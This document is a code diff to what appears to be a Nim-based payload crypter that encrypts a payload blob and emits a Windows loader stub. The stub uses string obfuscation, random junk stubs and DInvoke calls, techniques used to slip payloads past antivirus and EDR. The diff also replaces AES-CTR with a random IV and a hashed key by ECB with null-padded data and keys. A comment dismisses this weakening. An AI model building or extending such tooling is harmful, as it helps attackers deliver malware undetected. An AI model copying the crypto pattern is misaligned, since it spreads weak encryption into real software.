@@ -13,7 +13,6 @@ import os
 import osproc
 import docopt
 import random
-import base64
 import winim
 import streams
 when system.hostOS == "windows":
@@ -555,28 +554,45 @@ else:
 var
     data: seq[byte] = toByteSeq(blob)
 
-    ectx: CTR[aes256]
+    ectx: ECB[aes256]
     key: array[aes256.sizeKey, byte]
-    iv: array[aes256.sizeBlock, byte]
+
+
+# AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
+# 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
+if ((len(data) mod aes256.sizeBlock) != 0):
+    echo "[*] Payload length not a multiple of the BlockSize: ", aes256.sizeBlock
+    echo "[*] Length: " & $len(data)
+    echo "[*] Padding payload..."
+    data = data & newSeq[byte](aes256.sizeBlock - (len(data) mod aes256.sizeBlock))
+    echo "[*] New Length: " & $len(data)
+    
+var
     plaintext = newSeq[byte](len(data))
     enctext = newSeq[byte](len(data))
 
-# Create Random IV
-discard randomBytes(addr iv[0], 16)
 
-# We do not need to pad data, `CTR` mode works byte by byte.
 copyMem(addr plaintext[0], addr data[0], len(data))
+echo "[*] Plaintext length: " & $len(plaintext)
+echo "[*] Enctext length: " & $len(enctext)
 
-# Expand key to 32 bytes using SHA256 as the KDF
-var expandedkey = sha256.digest(envkey)
-copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
+# Convert Key to byte sequence
+var expandedkey = toByteSeq(envkey)
 
-ectx.init(key, iv)
+# AES256 key size is 256 bits or 32 bytes, so we need to pad key with
+# 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
+if ((len(expandedkey) mod (aes256.sizeBlock * 2)) != 0):
+    echo "[*] Key length not a multiple of KeySize: ", (aes256.sizeBlock * 2)
+    echo "[*] Length: " & $len(expandedkey)
+    echo "[*] Padding Key..."
+    expandedkey = expandedkey & newSeq[byte]((aes256.sizeBlock * 2) - (len(expandedkey) mod (aes256.sizeBlock * 2)))
+    echo "[*] New Length: " & $len(expandedkey)
+
+copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
+ectx.init(key)
 ectx.encrypt(plaintext, enctext)
 ectx.clear()
 
-#let encoded = encode(enctext)
-let encodedIV = encode(iv)
 echo "Writing encrypted blob to disk: "
 
 var content: string = cast[string](enctext)
@@ -794,9 +810,8 @@ import winim/lean
 #import winim/utils
 #from winim import winstr,winimbase,windef
 import strformat
-from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
+from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
 import strutils
-import base64
 import ptr_math
 import strenc
 when defined(Fluctuate):
@@ -842,7 +857,7 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-var dctx: CTR[aes256]
+var ectx: ECB[aes256]
 
 """
 
@@ -853,27 +868,31 @@ var key: array[aes256.sizeKey, byte]
 {getRandStub()}
 var envkey: string = obf("{envkey}")
 {getRandStub()}
-var iv: array[aes256.sizeBlock, byte]
-{getRandStub()}
-var pp: string = decode(obf("{encodedIV}"))
 """
 
 let Cryptstub3 = fmt"""
-# Decode and save IV
-copyMem(addr iv[0], addr pp[0], len(pp))
 {getRandStub()}
-# Encrypt Key
-var expandedkey = sha256.digest(envkey)
-copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
+    
+var expandedkey = toByteSeq(envkey)
+if ((len(expandedkey) mod aes256.sizeBlock) != 0):
+    when defined(verbose):
+        echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
+        echo "[*] Length: " & $len(expandedkey)
+        echo "[*] Padding Key with null bytes"
+    expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
+    when defined(verbose):
+        echo "[*] New Length: " & $len(expandedkey)
+
+copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
 {getRandStub()}
 var dectext = newSeq[byte](len(enctext))
 {getRandStub()}
 # Decrypt
-dctx.init(key, iv)
+ectx.init(key)
 {getRandStub()}
-dctx.decrypt(enctext, dectext)
+ectx.decrypt(enctext, dectext)
 {getRandStub()}
-dctx.clear()
+ectx.clear()
 
 """
 
@@ -1160,6 +1179,7 @@ var stub = Cryptstub1
 
 if (not noDInvoke):
     stub.add(DInvokeStubfirst)
+    stub.add(DInvokeGetPEB)
     stub.add(DInvokeStubSecond)
     stub.add(DInvokeStubThird)
     stub.add(DInvokeStubFourth)
